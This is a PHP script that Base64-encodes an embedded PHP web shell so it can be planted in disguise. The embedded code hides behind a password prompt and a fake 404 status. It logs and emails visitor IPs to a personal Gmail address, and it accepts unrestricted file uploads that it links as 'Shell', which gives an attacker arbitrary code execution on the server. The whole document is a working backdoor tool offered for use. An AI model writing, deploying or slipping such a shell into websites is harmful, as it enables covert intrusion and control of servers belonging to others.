<?php
// Original PHP code to be encoded
$phpCode = '<?php
// Define a hardcoded bcrypt hash of the password
define(\'HASHED_PASSWORD\', \'$2a$12$TFiKx.85EtSHQedNty/6CegqyYhB0qROm4I35fqWfou7I6U/a4DXe\'); // Replace this with the actual bcrypt hash

session_start();

// Check if the user is authenticated
if (isset($_POST[\'password\'])) {
    if (password_verify($_POST[\'password\'], HASHED_PASSWORD)) {
        $_SESSION[\'authenticated\'] = true;
    } else {
        $_SESSION[\'authenticated\'] = false;
    }
} elseif (!isset($_SESSION[\'authenticated\'])) {
    $_SESSION[\'authenticated\'] = false;
}

// If not authenticated, show the login form
if (!$_SESSION[\'authenticated\']) {
    echo \'<form method="post">
        <label for="password">Password:</label>
        <input type="password" name="password" id="password">
        <input type="submit" value="Login">
    </form>\';
    exit;
}

// If authenticated, proceed with the rest of the script

http_response_code(404); 

// Capture the IP address
$ipAddress = $_SERVER[\'REMOTE_ADDR\'];

// Log the IP address to a file
$logFile = \'ip_log.txt\';
file_put_contents($logFile, $ipAddress . PHP_EOL, FILE_APPEND);

// Prepare the email content
$to = \'robbyroda.00@gmail.com\';
$subject = \'IP Address Logged\';
$message = \'An IP address has been logged: \' . $ipAddress;
$headers = \'From: no-reply@example.com\';

// Send the email
mail($to, $subject, $message, $headers);

// Display the form
echo "<form method=\'post\' enctype=\'multipart/form-data\'>
    <input type=\'file\' name=\'a\'>
    <input type=\'submit\' value=\'Upload\'>
</form>
<pre>";

// Handle the file upload
if (isset($_FILES[\'a\'])) {
    // Sanitize the file name
    $fileName = basename($_FILES[\'a\'][\'name\']);
    
    // Move the uploaded file to the current directory
    move_uploaded_file($_FILES[\'a\'][\'tmp_name\'], $fileName);
    
    // Provide a link to the uploaded file
    echo \'<a href="\' . $fileName . \'">Shell</a>\';
}
?>';

// Encode the PHP code in Base64
$encodedCode = base64_encode($phpCode);
echo $encodedCode;
?>
